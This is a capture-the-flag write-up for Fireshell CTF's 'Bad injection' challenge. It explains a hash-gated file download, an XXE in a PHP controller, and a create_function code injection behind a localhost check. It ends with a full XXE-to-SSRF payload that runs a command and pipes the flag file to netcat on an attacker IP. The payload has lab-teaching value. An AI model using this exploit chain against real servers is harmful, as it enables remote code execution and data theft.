# Bad injection [ [Fireshell CTF] ](https://ctftime.org/event/727)

## [Enumerating the challenge](#Enumerating-the-challenge)

![index](https://i.imgur.com/vtZ1BiQ.png)

looking at the first 3 pages available **home**, **about** and **contact**, nothing useful is presented to us. But, by accessing the **List** page, we got the icon of an "image
corrupted" next to the loaded image.

By analyzing the source of this page, it is possible to see a passage of parameters:

```
download?file=files/test.txt&hash=293d05cb2ced82858519bdec71a0354b

```  

this is the "corrupted image". With these parameters, we can read any file on the server. The requirements are:

* the file path is accurate
* the **hash** parameter must contain the md5 of the searched file.


![listagem-diretorios](https://i.imgur.com/kVAupWz.png)


## Exploration


By scanning the server, we can find the file **Routes.php** inside **/app/** directory, where some http request is required.

    ...
    ...
    ...
    
    Route::set('custom',function(){
      $handler = fopen('php://input','r');
      $data = stream_get_contents($handler);
      if(strlen($data) > 1){
        Custom::Test($data);
      }else{
        Custom::createView('Custom');
      }
    });
    ...
    ...
    ...  


and the **Custom.php** file in **/app/Controllers/** .  

```
    <br />
    <b>Notice</b>:  Undefined variable: type in <b>/app/Controllers/Download.php</b> on line <b>21</b><br />
    <?php
    
    class Custom extends Controller{
      public static function Test($string){
          $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
          $test = $root->name;
          echo $test;
      }
    
    }
    
     ?>  
```

using XXE, we can also return files from the server.  


![xxe](https://i.imgur.com/5aKPJVP.png)

## Localhost bypass  


on the **Routes.php** file above mentioned, you can also see the following code:

```
Route::set('admin',function(){
  if(!isset($_REQUEST['rss']) && !isset($_REQUES['order'])){
    Admin::createView('Admin');
  }else{
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'){
      Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
    }else{
     echo ";(";
    }
  }
})
```  

This code verifies if that the request comes from the localhost within a conditional structure. If it does, then call Admin::sort.  

Looking at the **Admin.php** file (also downloaded enum the server), we can see that Admin::sort contains:


```usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));```

which gives us an obvious code injection.  

---

that way, we need to use the XXE to bypass the verification of localhost and then make a request to /Admin, which returns us the remote code execution.

the payload:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://127.0.0.1/admin?rss=http://YOUR_IP/file.xml&order=link.file_get_contents('http://YOUR_IP/'.exec('cat'.chr(32).'/da0f72d5d79169971b62a479c34198e7'.chr(124).'/bin/nc'.chr(32).'YOUR_IP'.chr(32).'YOUR_PORT'))">
    ]>
    <root><name>&xxe;</name></root>

* the **file.xml** file must be uploaded to your server, with a valid rss with the route and adminsort for request.  


the output:  


![flag](https://i.imgur.com/FyBD4eq.png)  
**Flag : f#{1_d0nt_kn0w_wh4t_i4m_d01ng}**  
---

* [RSS W3schools](https://www.w3schools.com/xml/xml_rss.asp)
